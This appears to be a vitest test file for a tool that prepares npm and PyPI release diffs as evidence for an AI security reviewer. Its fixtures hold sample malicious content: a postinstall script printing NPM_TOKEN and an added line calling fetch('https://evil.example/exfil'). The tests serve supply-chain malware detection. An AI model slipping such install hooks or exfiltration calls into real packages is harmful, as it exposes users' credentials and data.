import { describe, expect, test } from "vitest";
import {
  buildAiReviewPayload,
  buildInlinedEvidence,
  buildEvidenceIndex,
  createAiReviewTools,
  renderPathEvidence,
} from "../server/lib/ai-review-evidence.ts";
import { INITIAL_EVIDENCE_CHARS } from "../server/lib/ai-review-contract.ts";

const EMPTY_PACKAGE_JSON_DIFF = {
  name: "fixture",
  previousVersion: "1.0.0",
  stagedVersion: "1.0.1",
  scripts: [{ key: "postinstall", status: "added", staged: "node scripts/install" }],
  dependencies: [],
  entrypointsChanged: true,
};

function file(path, textSample) {
  return {
    path,
    size: textSample.length,
    sha256: `sha-${path}`,
    flags: [],
    textSample,
  };
}

function reviewOptions() {
  const packageJson = JSON.stringify(
    {
      name: "fixture",
      version: "1.0.1",
      main: "dist/index.js",
      scripts: { postinstall: "node scripts/install" },
    },
    null,
    2,
  );
  const files = [
    file("package.json", packageJson),
    file("scripts/install.js", "console.log(process.env.NPM_TOKEN);\n"),
    file("dist/index.js", "export const value = 1;\n"),
    file("README.md", "# fixture\n"),
  ];

  const previousFiles = files.map((entry) =>
    entry.path === "package.json"
      ? file(
          "package.json",
          JSON.stringify(
            {
              name: "fixture",
              version: "1.0.0",
              scripts: { postinstall: "node scripts/install" },
            },
            null,
            2,
          ),
        )
      : entry,
  );

  return {
    ecosystem: "npm",
    files,
    previousFiles,
    diff: [
      {
        path: "package.json",
        status: "modified",
        previousSize: 1,
        stagedSize: packageJson.length,
        previousSha256: "sha-old-package.json",
        stagedSha256: "sha-package.json",
        flags: [],
      },
      {
        path: "scripts/install.js",
        status: "unchanged",
        previousSize: files[1].size,
        stagedSize: files[1].size,
        previousSha256: files[1].sha256,
        stagedSha256: files[1].sha256,
        flags: [],
      },
      {
        path: "dist/index.js",
        status: "unchanged",
        previousSize: files[2].size,
        stagedSize: files[2].size,
        previousSha256: files[2].sha256,
        stagedSha256: files[2].sha256,
        flags: [],
      },
      {
        path: "README.md",
        status: "unchanged",
        previousSize: files[3].size,
        stagedSize: files[3].size,
        previousSha256: files[3].sha256,
        stagedSha256: files[3].sha256,
        flags: [],
      },
    ],
    packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
    ruleFindings: [
      {
        file: "scripts/install.js",
        severity: "high",
      },
    ],
    previousVersionAvailable: true,
  };
}

describe("AI review evidence tools", () => {
  test("allow unchanged files newly referenced by package scripts and entrypoints", async () => {
    const tools = createAiReviewTools(reviewOptions(), () => {});

    const scriptFiles = await tools.list_files.execute({ filter: "scripts" });
    expect(scriptFiles.files.map((entry) => entry.path)).toEqual([
      "package.json",
      "scripts/install.js",
    ]);

    const entrypointFiles = await tools.list_files.execute({ filter: "entrypoints" });
    expect(entrypointFiles.files.map((entry) => entry.path)).toEqual(["dist/index.js"]);

    const reads = await tools.read.execute({
      paths: ["scripts/install.js", "README.md"],
      maxChars: 200,
    });
    expect(reads.ok).toBe(true);
    expect(reads.results).toHaveLength(2);

    const script = reads.results[0];
    expect(script.ok).toBe(true);
    expect(script.status).toBe("unchanged");
    expect(script.kind).toBe("text");
    expect(script.content).toContain("process.env.NPM_TOKEN");

    const readme = reads.results[1];
    expect(readme.ok).toBe(false);
  });

  test("inlines the highest-priority evidence before tools", () => {
    const payload = buildAiReviewPayload(reviewOptions());

    const packageJson = payload.inlinedEvidence.find((entry) => entry.path === "package.json");
    expect(packageJson).toMatchObject({
      ok: true,
      kind: "diff",
      path: "package.json",
    });
    expect(packageJson.content).toContain('"postinstall"');

    const finding = payload.inlinedEvidence.find((entry) => entry.path === "scripts/install.js");
    expect(finding).toMatchObject({
      ok: true,
      kind: "text",
      path: "scripts/install.js",
    });
    expect(finding.content).toContain("process.env.NPM_TOKEN");

    expect(payload.inlinedEvidence.some((entry) => entry.path === "README.md")).toBe(false);
    expect(payload.inlinedEvidenceNote).toContain("highest-priority file diffs/text");
  });

  test("shares the path renderer between inlined evidence and read tool output", async () => {
    const options = reviewOptions();
    const payload = buildAiReviewPayload(options);
    const tools = createAiReviewTools(options, () => {});

    const read = await tools.read.execute({ paths: ["package.json"], maxChars: 4_000 });
    const direct = renderPathEvidence(
      "package.json",
      buildEvidenceIndex(options),
      4_000,
      { remaining: 4_000 },
      { remaining: 4_000 },
    );
    const inlined = payload.inlinedEvidence.find((entry) => entry.path === "package.json");

    expect(read.results[0]).toEqual(direct);
    expect(inlined).toEqual(read.results[0]);
  });

  test("respects the initial inlined evidence budget and reports omissions", () => {
    const manyFiles = Array.from({ length: 50 }, (_, index) => {
      const path = `src/file-${String(index).padStart(2, "0")}.js`;
      return file(
        path,
        `export const file${index} = ${"x".repeat(4_000)};
`,
      );
    });
    const options = {
      ecosystem: "npm",
      files: [
        file("package.json", JSON.stringify({ name: "fixture", version: "1.0.1" }, null, 2)),
        ...manyFiles,
      ],
      previousFiles: [],
      diff: [
        {
          path: "package.json",
          status: "modified",
          previousSize: 1,
          stagedSize: 40,
          previousSha256: "sha-old-package.json",
          stagedSha256: "sha-package.json",
          flags: [],
        },
        ...manyFiles.map((entry) => ({
          path: entry.path,
          status: "added",
          stagedSize: entry.size,
          stagedSha256: entry.sha256,
          flags: [],
        })),
      ],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
    };

    const inlined = buildInlinedEvidence(options);
    const totalContent = inlined.entries.reduce(
      (sum, entry) => sum + (entry.content?.length ?? 0),
      0,
    );

    expect(totalContent).toBeLessThanOrEqual(INITIAL_EVIDENCE_CHARS);
    expect(inlined.budgetExhausted || inlined.omittedPaths.length > 0).toBe(true);
    expect(inlined.omittedPaths.length).toBeGreaterThan(0);
  });

  test("returns a unified diff for changed files when previous text is available", async () => {
    const options = reviewOptions();
    options.previousFiles = options.previousFiles.map((file) =>
      file.path === "package.json" ? { ...file, textSample: '{"name":"fixture"}' } : file,
    );
    const tools = createAiReviewTools(options, () => {});

    const reads = await tools.read.execute({ paths: ["package.json"], maxChars: 4_000 });
    const entry = reads.results[0];
    expect(entry.ok).toBe(true);
    expect(entry.kind).toBe("diff");
    expect(entry.content).toMatch(/^[+\- ]/m);
  });

  test("runs multiple literal searches in one call", async () => {
    const tools = createAiReviewTools(reviewOptions(), () => {});

    const response = await tools.search_files.execute({
      queries: ["NPM_TOKEN", "postinstall"],
      maxResults: 5,
    });
    expect(response.ok).toBe(true);
    expect(response.results.map((entry) => entry.query)).toEqual(["NPM_TOKEN", "postinstall"]);
    const tokenHit = response.results[0];
    expect(tokenHit.ok).toBe(true);
    expect(tokenHit.matches.some((match) => match.path === "scripts/install.js")).toBe(true);
  });

  test("divides the read budget fairly so later batched paths are not starved", async () => {
    const paths = ["a.js", "b.js", "c.js", "d.js"];
    const files = paths.map((path) => file(path, `${path}:`.padEnd(10_000, "x") + "\n"));
    const options = {
      ecosystem: "npm",
      files,
      previousFiles: [],
      diff: paths.map((path, index) => ({
        path,
        status: "added",
        stagedSize: files[index].size,
        stagedSha256: files[index].sha256,
        flags: [],
      })),
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
    };
    const tools = createAiReviewTools(options, () => {});

    const reads = await tools.read.execute({ paths, maxChars: 16_000 });
    expect(reads.results).toHaveLength(4);
    for (const entry of reads.results) {
      expect(entry.ok).toBe(true);
      expect(entry.content.length).toBeGreaterThan(1_000);
    }
  });

  test("trims the initial payload to drop dead input tokens", () => {
    const payload = buildAiReviewPayload(reviewOptions());

    // Tool policy carries only the numeric budgets; the prose duplicated the
    // system prompt and tool descriptions.
    expect(payload.toolPolicy).toEqual({
      maxAgentSteps: expect.any(Number),
      maxToolResponseChars: expect.any(Number),
      maxTotalToolResponseChars: expect.any(Number),
    });

    // One file list, not two: the diff list is gone and the manifest subsumes it.
    expect(payload).not.toHaveProperty("changedFileDiff");
    expect(payload.changedFileCount).toBe(1);
    expect(payload.changedFileManifest.map((entry) => entry.path)).toEqual(["package.json"]);

    const entry = payload.changedFileManifest[0];
    // SHA256 is input-token noise an LLM can't reason over.
    expect(entry).not.toHaveProperty("sha256");
    // The byte-size delta the diff list carried lives on the manifest entry.
    expect(typeof entry.previousSize).toBe("number");
    expect(typeof entry.stagedSize).toBe("number");
    expect(entry.signals).toContain("diff:modified");

    // The package.json pointer no longer inlines a multi-KB text sample or hash;
    // the model reads it on demand.
    expect(payload.packageJson).not.toHaveProperty("textSample");
    expect(payload.packageJson).not.toHaveProperty("sha256");
  });

  test("elides long unchanged runs so a deep change fits the read budget", async () => {
    const filler = Array.from({ length: 400 }, (_, i) => `const line${i} = ${i};`).join("\n");
    const previousText = `${filler}\nconst tail = true;\n`;
    const stagedText = `${previousText}fetch('https://evil.example/exfil');\n`;
    const options = {
      ecosystem: "npm",
      files: [file("dist/big.js", stagedText)],
      previousFiles: [file("dist/big.js", previousText)],
      diff: [
        {
          path: "dist/big.js",
          status: "modified",
          previousSize: previousText.length,
          stagedSize: stagedText.length,
          previousSha256: "sha-prev",
          stagedSha256: "sha-staged",
          flags: [],
        },
      ],
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: true,
    };
    const tools = createAiReviewTools(options, () => {});

    const reads = await tools.read.execute({ paths: ["dist/big.js"], maxChars: 2_000 });
    const entry = reads.results[0];
    expect(entry.ok).toBe(true);
    expect(entry.kind).toBe("diff");
    // The added line sits ~8KB into the file; a 2KB read still reaches it
    // because the unchanged head collapses to an elision marker plus context.
    expect(entry.content).toContain("+fetch('https://evil.example/exfil');");
    expect(entry.content).toMatch(/@@ \d+ unchanged lines @@/);
    expect(entry.content.length).toBeLessThanOrEqual(2_000);
  });

  test("reports the total changed-file count when the manifest is capped", () => {
    const options = reviewOptions();
    options.diff = [
      ...options.diff,
      ...Array.from({ length: 320 }, (_, i) => ({
        path: `src/file-${i}.js`,
        status: "added",
        stagedSize: 10,
        stagedSha256: `sha-${i}`,
        flags: [],
      })),
    ];
    const payload = buildAiReviewPayload(options);

    expect(payload.changedFileCount).toBe(321);
    expect(payload.changedFileManifest).toHaveLength(300);
  });

  test("flags evidence-budget exhaustion so the model submits instead of re-reading", async () => {
    const bigFiles = ["a.js", "b.js", "c.js", "d.js"].map((path) => file(path, "x".repeat(20_000)));
    const options = {
      ecosystem: "npm",
      files: bigFiles,
      previousFiles: [],
      diff: bigFiles.map((entry) => ({
        path: entry.path,
        status: "added",
        stagedSize: entry.size,
        stagedSha256: entry.sha256,
        flags: [],
      })),
      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
      ruleFindings: [],
      previousVersionAvailable: false,
    };
    const tools = createAiReviewTools(options, () => {});

    const first = await tools.read.execute({ paths: ["a.js"], maxChars: 16_000 });
    expect(first.note).toBeUndefined();
    await tools.read.execute({ paths: ["b.js"], maxChars: 16_000 });
    const third = await tools.read.execute({ paths: ["c.js"], maxChars: 16_000 });
    expect(third.remainingEvidenceChars).toBe(0);
    expect(third.note).toContain("submit_review");

    const exhaustedRead = await tools.read.execute({ paths: ["d.js"], maxChars: 16_000 });
    expect(exhaustedRead.note).toContain("submit_review");
    expect(exhaustedRead.results[0].content).toBe("");
    const exhaustedSearch = await tools.search_files.execute({ queries: ["x"], maxResults: 1 });
    expect(exhaustedSearch.note).toContain("submit_review");
  });

  test("labels PyPI review payloads with the ecosystem-specific task", () => {
    const payload = buildAiReviewPayload({
      ...reviewOptions(),
      ecosystem: "pypi",
      files: [
        file(
          "wheel/py3-none-any/.dist-info/METADATA",
          "Name: fixture\nVersion: 1.0.1\nRequires-Dist: requests\n",
        ),
      ],
      previousFiles: [],
      diff: [
        {
          path: "wheel/py3-none-any/.dist-info/METADATA",
          status: "added",
          stagedSize: 56,
          stagedSha256: "sha-wheel-metadata",
          flags: [],
        },
      ],
      packageJsonDiff: {
        name: "fixture",
        previousVersion: "1.0.0",
        stagedVersion: "1.0.1",
        scripts: [],
        dependencies: [],
        entrypointsChanged: false,
      },
    });

    expect(payload.ecosystem).toBe("pypi");
    expect(payload.task).toContain("PyPI release candidate");
    expect(payload.task).toContain("workflow gate");
    expect(payload.packageJson).toBeNull();

    // An added file has no previous side, so previousSize is omitted from the
    // serialized payload the model actually receives.
    const added = JSON.parse(JSON.stringify(payload)).changedFileManifest[0];
    expect(added.status).toBe("added");
    expect(added).not.toHaveProperty("previousSize");
    expect(added.stagedSize).toBe(53);
  });
});
